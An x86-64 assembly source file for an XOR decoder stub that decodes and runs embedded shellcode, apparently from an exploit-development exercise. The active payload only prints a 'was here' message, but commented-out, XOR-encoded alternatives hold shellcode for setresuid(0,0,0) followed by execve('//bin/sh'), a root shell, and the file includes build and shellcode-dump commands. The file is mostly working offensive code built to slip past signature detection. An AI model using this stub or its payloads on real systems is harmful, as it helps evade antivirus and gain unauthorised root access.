/*

Author: Abhinav Thakur
File: xor_decoder_stub.s
Compile:        $ gcc -nostdlib -static xor_decoder_stub.s -o xor_decoder_stub.elf
Dump shellcode  $ objcopy --dump-section .text=xor_decoder_stub.raw ./xor_decoder_stub.elf

*/

.global _start
_start:
.intel_syntax noprefix

    jmp getCodeAddr

main:
        /*
                r8  = address of decodeMe (encoded shellcode)
                eax = len (size of encoded shellcode)
                ecx = i (counter)
        */
        pop r8
        xor eax, eax
        xor ecx, ecx
        mov al, 64        /* sizeof encoded shellcode = 64 bytes */

        /*
                for (ecx = 0; ecx < eax; ++ecx)
                        [decodeMe + ecx] ^= KEY
        */
again:
        cmp ecx, eax
        jge decodeMe
        xor byte ptr [r8 + rcx], 0xbc    /* KEY = 0xbc */
        add ecx, 1
        jmp again

getCodeAddr:
    call main
decodeMe:
/* write (1, "compilepeace was here x_x\n", 26) + exit(7) */ 
.byte 0xf4, 0x8d, 0x43, 0xeb, 0xf4, 0x43, 0x7b, 0xda, 0x7b, 0xb8, 0x98, 0xc4, 0xb6, 0xf4, 0x04, 0x9c, 0xd4, 0xd9, 0xce, 0xd9, 0x9c, 0xc4, 0xe3, 0xec, 0xf4, 0x04, 0xd9, 0xdd, 0xdf, 0xd9, 0x9c, 0xcb, 0xdd, 0xcf, 0xec, 0xf4, 0x04, 0xdf, 0xd3, 0xd1, 0xcc, 0xd5, 0xd0, 0xd9, 0xcc, 0xec, 0xe8, 0xe2, 0xd6, 0xa6, 0xe6, 0xd6, 0xbd, 0xe4, 0xb3, 0xb9, 0xd6, 0xbb, 0xe3, 0xd6, 0x80, 0xe4, 0xb3, 0xb9

/* 
;setresuid(0,0,0); + execve("//bin/sh", NULL, NULL); (37 bytes)
;Encoded shellcode obtained via :$ ./xor_encoder < setresuid_shell.raw
*/
/*.byte 0x3f, 0xf1, 0x3f, 0xf8, 0x3f, 0xdc, 0x3f, 0xce, 0xbe, 0x7b, 0x01, 0x0b, 0x3f, 0xce, 0x5e, 0xbe, 0x35, 0x46, 0xb1, 0x21, 0x21, 0x6c, 0x67, 0x60, 0x21, 0x7d, 0x66, 0x59, 0x46, 0x87, 0xe9, 0x3f, 0xf8, 0x3f, 0xdc, 0x01, 0x0b*/

/* ;execve("//bin/sh", NULL, NULL); (25 bytes) */
/* .byte 0x3f, 0xce, 0x5e, 0xbe, 0x35, 0x46, 0xb1, 0x21, 0x21, 0x6c, 0x67, 0x60, 0x21, 0x7d, 0x66, 0x59, 0x46, 0x87, 0xe9, 0x3f, 0xf8, 0x3f, 0xdc, 0x01, 0x0b */
